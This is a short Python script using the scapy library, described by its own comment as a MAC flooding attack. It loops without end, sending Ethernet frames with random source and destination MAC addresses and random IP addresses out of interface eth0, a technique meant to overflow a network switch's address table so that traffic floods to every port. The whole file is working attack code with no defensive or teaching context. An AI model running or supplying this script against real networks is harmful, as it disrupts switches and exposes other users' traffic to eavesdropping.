# Performs a MAC flooding attack

from scapy.all import Ether, RandMAC, RandIP, IP, sendp

iface = 'eth0'

try:
	while True:
		randmac = str(RandMAC())
		randip = str(RandIP())
		packet = Ether(src=randmac, dst=randmac) / IP(src=randip, dst=randip)
		sendp(packet, iface=iface, loop=0)
except KeyboardInterrupt:
	print('\n Stopping MAC flood attack')